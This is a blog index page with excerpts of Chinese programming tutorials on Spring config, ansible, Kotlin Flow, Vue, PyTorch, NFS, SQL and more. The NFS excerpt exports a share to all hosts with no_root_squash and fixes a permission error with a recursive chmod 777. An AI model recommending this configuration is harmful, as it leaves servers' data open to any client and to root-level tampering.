package com.lt.gateway.config; import lombok.Data; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.cloud.context.config.annotation.RefreshScope; import org.springframework.context.annotation.Configuration; import java.util.Set; /** * 网关配置类。（支持热更新） * * @Author ToneyMa * @Date 2023-09-27 **/ @Data @RefreshScope @ConfigurationProperties(prefix = "application") @Configuration public class ApplicationConfig { /** * token加密用的秘钥，长度至少为10个字符。(过短会报错) */ private String tokenKey; /** * 请求头携带token指定的name。 */ private String tokenHeaderName; /** * token过期时间。 */ private Long tokenExpiration; /** * 授信ip列表，不填表示全部信任，多ip用逗号分隔。 */ private String credentialIpList; /** * Session会话和用户权限在Redis中的过期时间(秒)。 * 缺省值是 one day */ private int sessionExpiredSeconds = 86400; /** * 基于全等的url白名单地址集合，过滤效率高于whitelistUrlPattern。 */ private Set&lt;String&gt; whiteListUrl; /** * 基于Ant Pattern模式判定规则的白名单地址集合。如：/aa/**。 */ private Set&lt;String&gt; whitelistUrlPattern; } 此时，我们只需要在yml配置文件中写入相应的配置即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6fd276af14d1dbdd4862a08f312c9afe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/311bf85e60972ca85eb8e4c8fecf0f3f/" rel="bookmark">
			ansible 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、ansible 简介1.1 ansible 是什么？1.2 ansible 特点1.3 ansible 架构图 二、ansible 任务执行2.1 ansible 任务执行模式2.2 ansible 执行流程2.3 ansible 命令执行过程 三、ansible 配置详解3.1 ansible 安装方式3.1.1 使用 pip（python的包管理模块）安装3.1.2 使用 yum 安装 3.2 ansible 程序结构3.3 ansible配置文件3.4 ansuble主机清单 四、ansible 常用命令4.1 ansible 命令集4.2 ansible-doc 命令4.3 ansible 命令详解 五、ansible 常用模块5.1 ping 模块5.2 command 模块5.3 shell 模块5.4 copy 模块5.5 file 模块5.6 fetch 模块5.7 cron 模块5.8 yum 模块5.9 apt 模块5.10 service 模块5.11 unarchive 模块5.12 lineinfile 模块5.13 script 模块5.14 setup 模块5.15 user 模块5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/311bf85e60972ca85eb8e4c8fecf0f3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a0e3f69b76387f1cd01fcbff3369ba2/" rel="bookmark">
			【Kotlin精简】第9章 Kotlin Flow
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 前言 上一章节我们学习了Kotlin的协程【Kotlin精简】第8章 协程，我们知道 协程实质是对线程切换的封装，能更加安全实现异步代码同步化，本质上协程、线程都是服务于并发场景下，其中协程是协作式任务，线程是抢占式任务。默认协程用来处理实时性不高的数据，请求到结果后整个协程就结束了，即它是一锤子买卖。
本章节我们来学习一下依赖Kotlin协程实现的Flow数据流。
2 Flow简介 2.1 Flow是什么 Flow是google官方提供的一套基于Kotlin协程的响应式编程模型，它与RxJava的使用类似，但相比之下Flow使用起来更简单，另外Flow作用在协程内，可以与协程的生命周期绑定，当协程取消时，Flow也会被取消，避免了内存泄漏风险。
Flow是Kotlin提供的一个工具，使用协程封装成生产者-消费者模式。
上游来负责生产、中介进行数据加工（可选）、下游来接收消耗。
官方对数据流三个成员的定义：
上游 - 提供方(生产者)：会生成添加到数据流中的数据。通过协程，数据流还可以异步生成数据。中介 - 数据加工 (可选)：修改发送到数据流的值，或修正数据流本身。下游 - 使用方（消费者）：使用或接收数据流中的值。
在Flow数据流中，api使用emit()生产，collect()消费
2.2 Flow 特性 flow{}构建块中的代码可以使用挂起函数
Flow构建器函数可以不用supend修饰符
流的每次单独收集都是按顺序执行的，除非使用特殊操作符
Flow是一种类似序列的冷流，flow构建器中代码直到流被收集的时候才运行
2.3 冷流热流 flow{}会创建一个数据流，并且这个数据流默认是冷流。下面是冷流和热流的区别：
冷流：当执行订阅的时候，上游发布者才开始发射数据流。订阅者与发布者是一一对应的关系，即当存在多个订阅者时，每个新的订阅者都会重新收到完整的数据。主动需要即是主动收集才会提供发射数据，即有消费collect才会触发热流：不管是否被订阅，上游发布者都会发送数据流到内存中。订阅者与发布者是一对多的关系，当上游发送数据时，多个订阅者都会收到消息。不管你需不需要一上来数据全都发射给你，不管是否消费collect都会触发 3 Flow使用 Flow官方文档可以参考一下，我们这里简单介绍一些Flow常用的流创建方式、操作符等。
Flow流使用步骤：
创建流：flow { ... }、flowOf{ ... }使用操作符修改、加工流数据发射流：collect 3.1 创建流 flow用于创建从顺序调用到发出函数的任意流。flowOf()函数根据一组固定的值创建流。asFlow()扩展函数可以将各种类型的函数转换为流。channelFlow创建从潜在并发调用到send函数的任意流。MutableStateFlow和MutableSharedFlow创建可直接更新的热流。 suspend fun main() { //1.不需要用挂起函数修饰符 flow { for (i in 1..3) { delay(1000)//可以使用挂起函数 emit(i)//发射元素 } }.collect { println("yvan flow:${it}") } // yvan flow:1 // yvan flow:2 // yvan flow:3 // 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a0e3f69b76387f1cd01fcbff3369ba2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2efb1f9b2ce609690cf2a39a216c5470/" rel="bookmark">
			前后端分离项目—通用后台管理系统（Vue &#43; SpringBoot）【二】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通用后台管理系统 该系统主要结合Element组件编辑前端，后端实现业务逻辑，组成一个简单的前后端分离项目。
该部分主要介绍画图功能的实现
使用组件：Echarts
折线图 需要渲染的数据：
orderData: {data: [{小米: 12.5,苹果: 11.2,华为: 9.8,oppo: 4.5,vivo: 4.0,}, {小米: 15.0,华为: 14.5,oppo: 8.1,vivo: 8.1,苹果: 13.4,},{小米: 8.9,华为: 16.4,oppo: 16.8,vivo: 14.8,苹果: 9.6,},{小米: 12.4,华为: 20.4,oppo: 18.1,vivo: 15.4,苹果: 9.3,},{小米: 13.1,华为: 12.7,oppo: 19.8,vivo: 19.1,苹果: 9.1,},{小米: 10.5,华为: 38.5,oppo: 17.8,vivo: 17.0,苹果: 7.5,},{小米: 12,华为: 37,oppo: 18,vivo: 18,苹果: 10,},{小米: 15,华为: 12,oppo: 21,vivo: 21.5,苹果: 15,},{小米: 13,华为: 18,oppo: 18,vivo: 18.5,苹果: 18,},{小米: 13,华为: 16,oppo: 18,vivo: 18.5,苹果: 16,},], date: ["2014", "2015", "2016", "2017", "2018", "2019", "2020", "2021", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2efb1f9b2ce609690cf2a39a216c5470/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/494389324309bbd1ac2bf37c8018d3a4/" rel="bookmark">
			PC端Tab栏与页面滚动联动（VUE2.0版本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		业务背景 一个页面以tab栏作为区块划分时，tab栏与页面彼此间的联动交互，往往能提供更好的体验：点击tab栏时页面滚动到tab栏对应的页面区域，同时滚动页面时tab栏随之改变。
本文基于VUE2.0实现此功能，图例如下：
HTML部分 &lt;!-- 使用Affix（antd affix）组件固定tab在顶部48px位置上 --&gt; &lt;!-- getTargetEle确定固定目标元素（需与页面滚动元素一致） --&gt; &lt;div class="a-container"&gt; &lt;Affix :offset-top="48" :target="getIdEle"&gt; &lt;div class="a-tabbar"&gt; &lt;div v-for="(item, index) in tabList" :key="item" class="a-tabbar-item" :class="activeKey === item ? 'a-tabbar-item-active' : ''" @click="handleTabClick(item, index)" &gt; &lt;div class="a-tabbar-item-title"&gt;tab栏{{ index }}&lt;/div&gt; &lt;!-- 分割线显示 --&gt; &lt;div v-if="index &lt; tabList.length - 1" class="a-tabbar-item-split"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/Affix&gt; &lt;div class="a-content"&gt; &lt;!-- 页面主体 --&gt; &lt;div class="a-content-item" :class="activeKey === item ? 'a-content-item-active' : ''" v-for="(item, index) in tabPaneList"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/494389324309bbd1ac2bf37c8018d3a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cd5136b6024cc1616d292f58531c5b4/" rel="bookmark">
			前端学习（应对面试）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		html：常见的块级（div走天下），行内块，行内标签随便能说出几个有代表的，input img a标签单独记忆
css：marigin-padding，font系列，border系列，定位，盒子模型（box-sizing），盒子阴影，flex布局，background系列等
js：数据类型（简单：字符串，数字型等，复杂：数组等）；数组常用方法重点记忆，对象字符串常用方法（分es6前后记忆，es6之前的方法，es6后的方法（filter，map，扩展运算符等）），解构赋值；应付面试还需要记一些，原型链，原型对象，对象原型，箭头函数，作用域，let，const，var区别和理解，promise等
ajax：简单理解记忆即可
vue：webpack可以稍微了解下，vue脚手架熟练使用，vue常用指令（v-model，v-for，v-if，v-else，v-on（@），v-bind（：），v-show）；vue生命周期；vue的computed，watch，data，methods，props，混入等；vue-router，路由基础和使用（保证手写出简单的路由文件）；vuex和路由要求相同，手写出简单的，这些你可以新建一个vue项目，从下载依赖包到写出这两个功能为止；axios的基本使用，$refs等。时间可以看下diff算法
js （1）cookie、localStorage、sessionStorage的区别和使用？
cookie：是存储在本地的数据，有时候也用cookies，通常经过加密，应用最经典的就是判断注册用户是否已经登录过该网站。 localStorage：仅在客户端保存（即浏览器），不参与和服务器的通信；没有时间限制，即使浏览器关闭，数据依然存在；
共同点：都是保存在浏览器端，且同源（同域名同端口下聚合显示）的。
区别：
cookie数据大小不能超过4K，同时因为每次http请求都会携带cookie，所以cookie只能保存很小的数据。
sessionStorage和localStorage不会自动把数据发给服务器，只在本地保存，虽然也有大小限制，但是要比cookie大得多，可以达到5M或者更大。
数据有效期不同，sessionStorage仅在当前浏览器窗口关闭前有效，不能持久保存；localStorage：始终有效，浏览器窗口关闭也一直保存；cookie：只在cookie设置的过期时间之前保存，即使浏览器窗口关闭。
作用域不同，sessionStorage在不同浏览器窗口的数据不能共享，即使是同一个页面；localStorage在所有的同源窗口中都是共享的；cookie也是在同源窗口中共享的，
（2） JS常用数据类型
简单数据类型：数字型Number，字符串类型String，布尔型Boolean，undefined，null
复杂数据类型（引用类型）：对象Object，数组Array。（在存储时仅仅在栈中以地址的形式指向堆）
（3）堆和栈
简单数据类型存储在栈中，复杂数据类型的地址存储在栈中
复杂数据类型存放在堆里面，首先在栈里面存放地址（十六进制表示），地址在指向堆里面的实例，真正的对象实例存放在堆空间中
（4）简单数据类型的相互转换
（1）转换为字符串
①var num = 10;
var str = num.toString();
②String（转换对象）；
③利用加号拼接字符串的方法。
num + ” “;
（2）转换为数组
①parseInt和parseFloat，整数型和浮点型的转换。
语法格式：parseInt（转换的对象）
parseInt("") //NaN
转换小数时得到的结果是整数，console.log(parseInt("3.14")); //3取整 console.log(parseInt("120px")); //120会去除px这个单位。从第一个字符开始，找第一个数
字，否则结果时NaN
和parseFloat（转换的对象）
转换可得到小数（浮点数），转换整数时依旧时整数，用法与上面基本相似。
②利用Number（转换的对象）
var str = “123”；console.log(Number(str));
③利用算数运算（隐式转换）- / *(不用加号)
（3）转换为布尔型
①Boolean()函数 ==&gt; Boolean("") //false
②!!
（5）前置运算符和后置运算符的区别
前置运算符返回已经计算出结果的值，即++3在使用的时候代表4
后置运算符返回未经计算的值，即3++在使用的时候表示3
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cd5136b6024cc1616d292f58531c5b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5551538a5c18269f17a44a95bb7fb1cc/" rel="bookmark">
			Swagger @ApiModelProperty 绑定枚举类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先看效果 1.自定义注解 import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @description: swagger 属性绑定 枚举对象注解 * @author guyi * @date 2023/11/24 9:53 **/ @Target({ElementType.FIELD}) @Retention(RetentionPolicy.RUNTIME) public @interface ApiModelPropertyEnum { Class value(); } 2.实现Swagger 的 ModelPropertyBuilderPlugin 接口 import com.fasterxml.classmate.ResolvedType; import com.fasterxml.classmate.TypeResolver; import com.fasterxml.jackson.databind.introspect.BeanPropertyDefinition; import io.swagger.annotations.ApiModelProperty; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.core.annotation.Order; import org.springframework.stereotype.Component; import springfox.documentation.schema.Annotations; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spi.schema.ModelPropertyBuilderPlugin; import springfox.documentation.spi.schema.contexts.ModelPropertyContext; import springfox.documentation.spring.web.DescriptionResolver; import springfox.documentation.swagger.common.SwaggerPluginSupport; import springfox.documentation.swagger.schema.ApiModelProperties; import java.lang.reflect.*; import java.util.Map; import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5551538a5c18269f17a44a95bb7fb1cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd09d7b19d7078d9ef58c13b68b3e58f/" rel="bookmark">
			NFS3 升级为nfs4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NFS3 升级为NFS4
NFSv4避免了单个 RPC 请求的开销和随之而来的延迟问题，并允许将这些调用捆绑在一起。例如，查找、打开、读取和关闭可以通过线路发送一次，并且服务器可以将整个复合调用作为单个实体执行。
1.服务器端 调整exports 手动指定根目录
查看支持的版本：cat /proc/fs/nfsd/versions
-2 +3 +4 +4.1 +4.2
在 NFSv4 中，通常会将根目录作为一个特殊的导出，并设置正确的 fsid 以标识根目录(通过fsid=0指定根目录)。这样，客户端可以通过挂载根目录来访问整个 NFSv4 文件系统的结构和内容。
vim /etc/exports
/data *(rw,sync,no_root_squash,no_subtree_check,insecure,fsid=0)
根据 NFSv4 规范，如果没有显式指定根目录的导出，NFSv4 客户端通常会默认将/根目录作为一个共享来访问整个文件系统。
2.客户端 mount时 指定为nfs4 即可，如下所示
10.1.1.100:/data /nfs-data/data nfs4 rw,noatime,nodiratime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.3.1.76,local_lock=none,addr=10.1.1.100 0 0
NFS挂载报错：mount.nfs4: access denied by server while mounting 10.1.1.100:/data
权限不足，去nfs服务器端 chmod -R 777 /data即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac7aabcbd69e5ca15900635b1bf2bea5/" rel="bookmark">
			Java 8 lambda的一个编译bug
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近利用github action向Maven中央仓库发布企业微信SDK时会失败，从日志中发现是系统资源耗尽了，日志如下：
[INFO] Changes detected - recompiling the module! :dependency [INFO] Compiling 35 source files with javac [debug target 8] to target/classes The system is out of resources. Consult the following stack trace for details. java.lang.StackOverflowError at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.sun.tools.javac.comp.Attr.attribTree(Attr.java:576) at com.sun.tools.javac.comp.Attr.visitLambda(Attr.java:2435) at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.sun.tools.javac.comp.Attr.attribTree(Attr.java:576) at com.sun.tools.javac.comp.Attr.visitLambda(Attr.java:2435) at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.sun.tools.javac.comp.Attr.attribTree(Attr.java:576) at com.sun.tools.javac.comp.Attr.visitLambda(Attr.java:2435) at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.sun.tools.javac.comp.Attr.attribTree(Attr.java:576) at com.sun.tools.javac.comp.Attr.visitLambda(Attr.java:2435) at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.sun.tools.javac.comp.Attr.attribTree(Attr.java:576) at com.sun.tools.javac.comp.Attr.visitLambda(Attr.java:2435) at com.sun.tools.javac.tree.JCTree$JCLambda.accept(JCTree.java:1624) at com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac7aabcbd69e5ca15900635b1bf2bea5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06499658deb42fe9027ead4d6eea4be9/" rel="bookmark">
			PyTorch深度学习入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Python学习中的两大法宝函数（也可用于PyTorch）
理解Package结构及法宝函数的作用
实战运用两大法宝函数
PyCharm及Jupyter使用及对比
PyTorch加载数据
Dataset类代码实战
TensorBoard的使用 1、TensorBoard的安装
2、add_scalar()的使用(常用来绘制train/val loss)​编辑
3、add_image()的使用(常用来观察训练结果)
Transforms的使用 1、transforms用于对图形进行变换
2、常见的Transforms
1）transforms.ToTensor()
2）transforms.Composes（）
3）transforms.Normalize（）
4）transforms.Resize（）
4）transforms.RandomCrop（）
torchvision中的数据集使用
DataLoader的使用
神经网络的基本骨架：nn.Module的使用
卷积操作
神经网络-卷积层
神经网络-最大池化的使用
神经网络-非线性激活
神经网络-线性层及其他层介绍
神经网络-搭建小实战和Sequential的使用
损失函数与反向传播
优化器
现有网络模型的使用及修改
网络模型的保存与读取
完整的模型训练套路
利用GPU训练
方式一：
方式二：
完整的模型验证（测试，demo）套路
看看开源项目
Python学习中的两大法宝函数（也可用于PyTorch） 理解Package结构及法宝函数的作用 1.名称是pytorch的package
2、法宝函数
实战运用两大法宝函数 dir（）
help（）
eg.dir（torch）
help（torch.cuda.is_avaliable()）注意：没有这个括号！
PyCharm及Jupyter使用及对比 pycharm控制台：回车——运行，shift+回车——换行
Jupyter：回车——换行，shift+回车——运行
PyTorch加载数据 数据集的组成形式：
（1）文件夹名称为这个文件夹内所有图片所对应的lable
（2）图片和lable对应两个文件夹
（3）图片的名称为这张图片所对应的lable
读取数据：
Dataset类代码实战 python控制台
Dataset类代码实战见read_data.python文件
TensorBoard的使用 1、TensorBoard的安装 图像变换，即transform的使用。想要演示transform结果，运行完一个对应的方法，需要展示这个图像，就需要用到TensorBoard，探究不同阶段模型的输出。
用help（）可以查看这个类SummaryWriter，在PyCharm中可以按Ctrl，然后点击SummaryWriter去查看
2、add_scalar()的使用(常用来绘制train/val loss)
from tensorboardX import SummaryWriter #从这个工具包（tensorboardX）导入这个类（SummaryWriter） writer = SummaryWriter("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06499658deb42fe9027ead4d6eea4be9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37a80208eef0b50252d766442e60d219/" rel="bookmark">
			MediaPipe - 02.人脸识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本系列文章介绍各类图像识别的使用方法，运用这些技巧采集更多的原始数据，训练我们的AI模型。本系列文章要有Python和OpenCV基础。
人脸识别 MediaPipe的人脸识别功能是很强大的，除了一般人脸识别，还可以人脸三维重建。这节我们只介绍一般人脸识别。
MediaPipe的人脸识别会找出图片中人脸的6个关键点，2个眼睛，2个耳朵，鼻子和嘴巴。这些关键点将有助于我们对人脸进行下一步的操作。比如，加个眼镜等。
人脸识别程序 这个程序将从一张照片中识别出人脸，并把每个人脸在图片中的范围和6个关键点标注出来。mp.solutions.drawing_utils是MediaPipe内置的，强大的绘制工具。
import cv2 import mediapipe as mp if __name__ == '__main__': mp_face_detection = mp.solutions.face_detection mp_drawing = mp.solutions.drawing_utils with mp_face_detection.FaceDetection(min_detection_confidence=0.5) as face_detection: img=cv2.imread("faces.png") img = cv2.flip(img,1) imgrgb = cv2.cvtColor(img,cv2.COLOR_BGR2RGB) results = face_detection.process(imgrgb) img1 = img.copy() if results.detections: for fid,detection in enumerate(results.detections): box = detection.location_data.relative_bounding_box ih,iw,ic = img.shape bbox = [int(box.xmin*iw),int(box.ymin*ih),int(box.width*iw),int(box.height*ih)] print(fid,bbox) print("RIGHT_EYE:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.RIGHT_EYE)) print("LEFT_EYE:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.LEFT_EYE)) print("NOSE_TIP:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.NOSE_TIP)) print("MOUTH_CENTER:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.MOUTH_CENTER)) print("RIGHT_EAR_TRAGION:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.RIGHT_EAR_TRAGION)) print("LEFT_EAR_TRAGION:",mp_face_detection.get_key_point(detection,mp_face_detection.FaceKeyPoint.LEFT_EAR_TRAGION)) mp_drawing.draw_detection(img1,detection) cv2.imshow('img',img1) 运行结果 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dd1928c9aed7d383e8297f76778981a/" rel="bookmark">
			GO语言实现txt文本多行合并为一行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 windows系统txt文件
input.txt多行合并为一行 package main import ( "fmt" "io/ioutil" "strings" ) func main() { content, err := ioutil.ReadFile("E:\\gin_demo\\demo30DNF\\youhua\\input.txt") if err != nil { fmt.Println("Error reading input file:", err) return } processedContent := strings.ReplaceAll(string(content), "\r\n", "") err = ioutil.WriteFile("E:\\gin_demo\\demo30DNF\\youhua\\output.txt", []byte(processedContent), 0644) if err != nil { fmt.Println("Error writing output file:", err) return } fmt.Println("Successfully removed newlines and saved to output.txt.") } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6916a4eb6a5b0743294b0fd5d2479c1/" rel="bookmark">
			Mall4j商城实战 - 部署指南 (一篇文章带你玩转各种技术)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📘 Mall4j商城实战：部署指南 🦑 gitee地址 本人更改后的：https://gitee.com/yueerba/mall4cloud.git原地址：https://gitee.com/gz-yami/mall4cloud.git 🚄 部署环节 🔗 Window 子系统 + Docker Desktop 安装教程🔗 部署 Mysql 8.0 数据库🔗 部署 Canal 数据库增量日志解析🔗 部署 RocketMQ 消息队列🔗 部署 Elasticsearch、Kibana 数据搜索🔗 部署 Nacos 服务注册和配置管理🔗 部署 Seata 实现分布式事务🔗 部署 Redis 分布式缓存🔗 部署 Minio 图片文件上传🔗 部署前后端到 Docker🔗 数据库分析🔗 代码功能分析 🧩 中间件部署须知 在文件编辑器上，使用全局替换的方式，将整个项目文件夹下的所有 192.168.0.105 替换为 自己的服务器的 IP mysql 配置文件必须授权为 755 ，或是 644，不然会报错。canal 的配置必须在 canal-admin 界面中重新配置方能生效（包括 server 和 instance）。rocketmq 的组件部署必须在同一网络下。es 查询必须在 es 界面上配置 product 和 order 的索引，不然服务查询会报错。nacos 启动之后，必须在线更改配置，方能保证服务的正常运行。redis 需要设置密码以提高安全性。minio 必须设置 mall4jcloud 的存储桶，并设置为可读写，为了端口不冲突，端口更改：9000——&gt; 9001 名称链接账号密码Miniohttp://127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6916a4eb6a5b0743294b0fd5d2479c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa00a7031fa54a0f779773c275566f1a/" rel="bookmark">
			【点云surface】基于多项式重建的平滑和法线估计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 介绍 基于多项式重建的平滑和法线估计（Smoothing and normal estimation based on polynomial reconstruction）是一种常用的点云处理方法，用于平滑点云数据并估计每个点的法线信息。
该方法基于Moving Least Squares（MLS）算法，通过拟合每个点的邻域数据来进行平滑处理。在平滑过程中，使用多项式函数来逼近邻域内的点，然后通过对多项式函数求导来估计每个点的法线。
具体步骤如下：
​
对于每个点，确定其邻域范围，可以使用固定半径或固定邻居数量来定义邻域。
对于每个点的邻域数据，使用多项式函数来逼近这些点。多项式函数的阶数可以根据实际需求进行选择。
对于逼近得到的多项式函数，通过求导来计算每个点的法线向量。一阶导数表示法线的方向。
将平滑后的点云数据和估计的法线信息保存或用于后续处理。
​​​​​​
2 与普通法线估计的区别 与普通的法线估计相比，基于多项式重建的平滑和法线估计方法具有以下区别：
平滑效果更好：基于多项式重建的方法通过拟合邻域数据的多项式函数来进行平滑处理，相比于普通的法线估计方法，可以更好地去除噪声和不规则性，得到更平滑的点云数据。
考虑了局部几何特征：基于多项式重建的方法在拟合多项式函数时，会考虑点的局部几何特征，如曲率和法线方向。这使得法线估计更加准确，并且可以更好地捕捉点云中的细节和曲面变化。
参数可调性：基于多项式重建的方法提供了一些参数，如平滑半径和多项式阶数等，可以根据实际需求进行调整。这使得算法具有更大的灵活性，可以适应不同的点云数据和应用场景。
运算复杂度较高：与普通的法线估计方法相比，基于多项式重建的方法需要进行多项式函数的拟合和求导计算，因此运算复杂度较高。这可能会导致算法的计算时间较长，特别是在处理大规模点云数据时。
总的来说，基于多项式重建的平滑和法线估计方法在平滑效果和法线准确性方面具有优势，但计算复杂度较高。
3 什么时候用 通过使用基于多项式重建的平滑和法线估计方法，可以减少点云数据中的噪声，并提取出平滑的表面特征。这对于许多点云处理任务，如表面重建、物体识别和点云配准等都是非常有用的。
4 代码 #include &lt;pcl/point_types.h&gt; #include &lt;pcl/io/pcd_io.h&gt; #include &lt;pcl/search/kdtree.h&gt; #include &lt;pcl/surface/mls.h&gt; #include &lt;pcl/visualization/cloud_viewer.h&gt; int main() { pcl::PointCloud&lt;pcl::PointXYZ&gt;::Ptr cloud (new pcl::PointCloud&lt;pcl::PointXYZ&gt;()); pcl::io::loadPCDFile("/home/lrj/work/pointCloudData/raw.gitmirror.com_PointCloudLibrary_pcl_master_test_bun0.pcd", *cloud); pcl::search::KdTree&lt;pcl::PointXYZ&gt;::Ptr tree(new pcl::search::KdTree&lt;pcl::PointXYZ&gt;); pcl::MovingLeastSquares&lt;pcl::PointXYZ, pcl::PointNormal&gt; mls; mls.setComputeNormals(true); mls.setInputCloud(cloud); mls.setPolynomialOrder(2); // 多项式函数的阶数 mls.setSearchMethod(tree); mls.setSearchRadius(0.03); pcl::PointCloud&lt;pcl::PointNormal&gt; mls_points; mls.process(mls_points); pcl::visualization::CloudViewer vis("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa00a7031fa54a0f779773c275566f1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2e728d447a552048afbd583fcf0b247/" rel="bookmark">
			SQL 常见函数整理 _ Format 将日期、时间和数字值格式化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 用法
用于将日期、时间和数字值格式化为指定的字符串表示形式。
2. 基本语法
FORMAT(value, format) value ：要格式化的日期、时间或数字值。format ：指定要应用的格式的字符串。可以使用不同的格式代码来定义所需的格式，格式代码的具体取决于值的类型。 ① 日期格式代码
yyyy：四位数的年份。MM：两位数的月份，带前导零 （注意和分钟区分，分钟是小写的mm）MMM：缩写的月份名称（例如：Jan、Feb）dd：两位数的日期，带前导零 select format(cast('2024-01-01 10:35:14.277' as datetime), 'yyyy') as Year ,format(cast('2024-01-01 10:35:14.277' as datetime), 'MM' ) AS Month ,format(cast('2024-01-01 10:35:14.277' as datetime), 'MMM' ) AS MonthAbbr ,format(cast('2024-01-01 10:35:14.277' as datetime), 'dd' ) as day 查询结果如下图所示：
② 时间格式代码
hh：12 小时制的小时，带前导零（例如：01-12）HH：24 小时制的小时，带前导零（例如：00-23）mm：分钟，带前导零（例如：00-59）ss：秒，带前导零（例如：00-59） select format(cast('2024-01-01 19:05:09.277' as datetime), 'hh') as Hour_12h ,format(cast('2024-01-01 19:05:09.277' as datetime), 'HH' ) AS Hour_24h ,format(cast('2024-01-01 19:05:09.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2e728d447a552048afbd583fcf0b247/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e78b85c60d3d769a7337c9ab067bd046/" rel="bookmark">
			Redisson分布式锁实现原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redisson主要解决一下问题
